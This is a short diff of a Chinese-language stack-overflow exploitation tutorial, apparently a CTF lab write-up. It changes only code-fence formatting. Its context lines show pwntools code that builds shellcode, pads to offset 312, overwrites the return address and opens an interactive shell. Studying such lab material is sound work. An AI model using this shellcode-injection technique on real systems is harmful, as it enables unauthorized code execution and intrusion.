@@ -97,7 +97,7 @@ Found at offset 312
 
 为了使 shellcode 正确，我们将把 `context.binary` 设置为我们的二进制文件；这会获取诸如架构、操作系统和位数之类的东西，并使 pwntools 能够为我们提供 shellcode。
 
-```python
+```python showLineNumbers
 from pwn import *
 
 context(os='linux', arch='amd64', log_level='debug')
@@ -113,7 +113,7 @@ p = process()
 
 现在我们可以使用 pwntools 出色的 shellcode 功能轻易的构建 shellcode。
 
-```python
+```python showLineNumbers
 payload = asm(shellcraft.sh())      # 构建 Shellcode
 payload = payload.ljust(312, b'A')  # 溢出 Padding
 payload += p32(0xffffd664)          # 返回地址
@@ -121,7 +121,7 @@ payload += p32(0xffffd664)          # 返回地址
 
 现在让我们将其发送出去并使用 `p.interactive()`，它使我们能够与 shell 通信。
 
-```python
+```python showLineNumbers
 p.sendline(payload)
 
 p.interactive()
@@ -151,7 +151,7 @@ cub3y0nd
 
 ## 0x05 最终 Exploit
 
-```python:exp.py
+```python:exp.py showLineNumbers
 from pwn import *
 
 context(os='linux', arch='amd64', log_level='info')
